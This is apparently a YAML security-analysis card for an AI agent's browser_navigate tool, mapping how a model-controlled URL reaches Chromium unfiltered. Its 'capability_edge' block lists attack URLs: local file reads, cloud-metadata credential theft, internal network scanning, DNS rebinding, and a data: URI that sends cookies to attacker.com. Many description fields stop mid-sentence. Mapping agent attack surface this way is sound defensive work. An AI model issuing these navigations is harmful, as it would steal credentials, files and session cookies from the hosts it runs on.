# _run_browser_command(task, "open", [url])

```yaml
schema_version: sink-capability-card/v2
card_id: SCC-1abd24fa77543f01
api: _run_browser_command(task, "open", [url])
api_family: _run_browser_command.open
runtime:
  language: python
  ecosystem: project-source
  package: _run_browser_command
  version: legacy-source-bound
capability_class: browser-nav
normative_authority: capability-facts-only
bound_sinks: []
roles:
- role_id: destination-url
  description: Legacy controlled role destination-url.
  bindings:
  - expression: url
    caller_bindable: true
- role_id: request-body
  description: Legacy controlled role request-body.
  bindings:
  - expression: json
    caller_bindable: true
facets:
- facet_id: legacy-facet-f1395964
  capability: Navigate a real Chromium browser to an arbitrary URL, with the attacker
  role_ids:
  - destination-url
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-052b7711
  capability: The URL is passed as a positional argument to `agent-browser open`, which
  role_ids:
  - destination-url
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-27e59d79
  capability: '**Arbitrary HTTP/HTTPS navigation**: navigate to any reachable hostname or'
  role_ids:
  - destination-url
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-f721d20d
  capability: '**Local filesystem read via `file://` scheme**: Chromium supports'
  role_ids:
  - destination-url
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-f5700529
  capability: '**`data:` URI navigation**: navigate to `data:text/html,...` to render'
  role_ids:
  - destination-url
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-5c858703
  capability: '**`about:` scheme**: navigate to browser-internal pages such as'
  role_ids:
  - destination-url
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-a9661d69
  capability: '**`blob:` URLs**: navigate to blob URLs created in the browser session,'
  role_ids:
  - destination-url
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-32f4d531
  capability: '**`javascript:` pseudo-URL**: in some Chromium contexts, navigating to'
  role_ids:
  - destination-url
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-444072a3
  capability: '**View-source access via `view-source:` scheme**: navigate to'
  role_ids:
  - destination-url
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-0e3fe73d
  capability: '**HTTP redirect following**: Chromium follows HTTP 3xx redirects by'
  role_ids:
  - destination-url
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-9a22b9f0
  capability: '**DNS rebinding / TOCTOU**: DNS resolution happens at connect time inside'
  role_ids:
  - destination-url
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-caba52d4
  capability: '**Arbitrary port navigation**: navigate to any TCP port'
  role_ids:
  - destination-url
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-6b34d4c5
  capability: '**Non-standard protocol handlers**: Chromium supports registered protocol'
  role_ids:
  - destination-url
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-bb970623
  capability: The browser request includes cookies, authentication headers, and session
  role_ids:
  - destination-url
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-b1ffabdc
  capability: '**SCHEME NOTE**: Because `normalize_url_for_request` only normalizes'
  role_ids:
  - destination-url
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
library_guarantees: []
defaults:
- default_id: legacy-default-0e34c50d
  role_id: null
  value: Chromium follows HTTP 3xx redirects by default (no `--disable-redirects`
  security_effect: Chromium follows HTTP 3xx redirects by default (no `--disable-redirects`
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-174d1469
  role_id: null
  value: DNS resolution happens inside the Chromium process at navigation time,
  security_effect: DNS resolution happens inside the Chromium process at navigation time,
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-dad8b1a9
  role_id: null
  value: Non-`http`/`https` schemes are passed through to `agent-browser open` as-is
  security_effect: Non-`http`/`https` schemes are passed through to `agent-browser open` as-is
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-e2833b26
  role_id: null
  value: The Chromium browser process inherits the agent's network environment
  security_effect: The Chromium browser process inherits the agent's network environment
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-134f23d4
  role_id: null
  value: The browser process runs with the same filesystem permissions as the agent
  security_effect: The browser process runs with the same filesystem permissions as the agent
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-096a3cf0
  role_id: null
  value: No URL scheme allowlist is applied at the `agent-browser` level — Chromium
  security_effect: No URL scheme allowlist is applied at the `agent-browser` level — Chromium
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-b8324bc8
  role_id: null
  value: Browserbase cloud sessions use remote browsers with remote network
  security_effect: Browserbase cloud sessions use remote browsers with remote network
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-64de8993
  role_id: null
  value: Chromium automatically adds default ports (80 for http, 443 for https)
  security_effect: Chromium automatically adds default ports (80 for http, 443 for https)
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-36cc2a3e
  role_id: null
  value: The `agent-browser` daemon and Chromium child processes inherit the
  security_effect: The `agent-browser` daemon and Chromium child processes inherit the
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
example_usage:
  benign: '# Normal web navigation — model navigates to a public URL

    browser_navigate("https://en.wikipedia.org/wiki/Main_Page")


    # Navigate to a specific page with query parameters

    browser_navigate("https://api.example.com/data?page=1&limit=10")

    '
  capability_edge: '# --- Local file read ---

    # Chromium navigates to file:// URLs; agent user filesystem access applies

    browser_navigate("file:///etc/passwd")

    # → browser renders /etc/passwd contents


    # --- Cloud metadata endpoint ---

    # Browser makes an HTTP request to the instance metadata service

    browser_navigate("http://169.254.169.254/latest/meta-data/iam/security-credentials/")

    # → browser receives IAM credentials from cloud metadata (AWS IMDSv1)


    # --- Internal network scanning ---

    # Browser navigates to an internal service reachable from the agent host

    browser_navigate("http://192.168.1.1/admin")

    browser_navigate("http://127.0.0.1:6379/")  # Redis text protocol interaction


    # --- DNS rebinding ---

    # Attacker-controlled domain resolves to public IP at check time,

    # then to 127.0.0.1 when Chromium resolves it at connect time

    browser_navigate("http://rebind.attacker.com/admin")


    # --- data: URI with exfiltration ---

    # Renders attacker HTML that fetches an external beacon

    browser_navigate("data:text/html,<script>fetch(''https://attacker.com/log?c=''+document.cookie)</script>")


    # --- Custom scheme / protocol handler ---

    # If registered protocol handlers exist on the system

    browser_navigate("file:///proc/self/environ")

    '
provenance:
- /root/project/xclaw-project/hermes-agent/tools/browser_tool.py:2309 — browser_navigate(url) tool entrypoint, model controls url
- /root/project/xclaw-project/hermes-agent/tools/browser_tool.py:2410 — _run_browser_command(nav_session_key, 'open', [url]) call
- /root/project/xclaw-project/hermes-agent/tools/browser_tool.py:1895-2098 — _run_browser_command implementation builds cmd_parts = [agent-browser, --json, open, url] and spawns via subprocess.Popen
- /root/project/xclaw-project/hermes-agent/tools/browser_tool.py:1994-2091 — command constructed and executed; Chromium navigates to the attacker-supplied URL
- '/root/project/xclaw-project/hermes-agent/tools/url_safety.py:38-76 — normalize_url_for_request: only normalizes http/https; non-http/https schemes returned raw (line 59-60)'
- /root/project/xclaw-project/hermes-agent/tools/browser_tool.py:2333 — url is normalized by normalize_url_for_request before passing to _run_browser_command
- OWASP SSRF Cheat Sheet — cloud metadata endpoints (169.254.169.254), internal networks, file://, URL scheme abuse
- 'Chromium URL scheme support — file://, data:, about:, blob:, javascript:, view-source:'
```
